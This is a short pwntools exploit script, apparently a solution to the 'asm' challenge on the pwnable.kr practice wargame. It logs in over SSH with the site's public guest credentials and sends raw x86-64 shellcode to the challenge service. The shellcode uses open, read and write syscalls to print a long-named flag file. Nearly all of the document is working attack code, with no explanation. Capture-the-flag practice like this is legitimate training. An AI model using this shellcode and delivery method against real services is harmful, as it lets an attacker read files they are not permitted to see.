from pwn import *


shellcode="\xeb\x59\x48\xb8\x02\x00\x00\x00\x00\x00\x00\x00\x5f\x48\xbe\x00\x00"\
"\x00\x00\x00\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x31\xc0\x48\xb8\x00"\
"\x00\x00\x00\x00\x00\x00\x00\x48\x89\xe6\x48\xba\x64\x00\x00\x00\x00"\
"\x00\x00\x00\x0f\x05\x48\xb8\x01\x00\x00\x00\x00\x00\x00\x00\x48\xbf"\
"\x01\x00\x00\x00\x00\x00\x00\x00\x48\x89\xe6\x48\xba\x64\x00\x00\x00"\
"\x00\x00\x00\x00\x0f\x05\xe8\xa2\xff\xff\xff\x74\x68\x69\x73\x5f\x69"\
"\x73\x5f\x70\x77\x6e\x61\x62\x6c\x65\x2e\x6b\x72\x5f\x66\x6c\x61\x67"\
"\x5f\x66\x69\x6c\x65\x5f\x70\x6c\x65\x61\x73\x65\x5f\x72\x65\x61\x64"\
"\x5f\x74\x68\x69\x73\x5f\x66\x69\x6c\x65\x2e\x73\x6f\x72\x72\x79\x5f"\
"\x74\x68\x65\x5f\x66\x69\x6c\x65\x5f\x6e\x61\x6d\x65\x5f\x69\x73\x5f"\
"\x76\x65\x72\x79\x5f\x6c\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f"\
"\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f"\
"\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f"\
"\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f"\
"\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x30\x30\x30"\
"\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"\
"\x30\x30\x30\x30\x30\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f"\
"\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x30\x30\x30\x30\x30\x30"\
"\x30\x30\x30\x30\x30\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f"\
"\x30\x6f\x6e\x67";



ssh_pwn=ssh(user='asm',host='pwnable.kr',port=2222,password='guest')
p=ssh_pwn.remote(host='0',port=9026)
#p=ssh_pwn.process(argv=['./asm'])
p.sendline(shellcode)
print (p.recvuntil(':'))
print (p.recvuntil(':'))
print (p.recv(4096))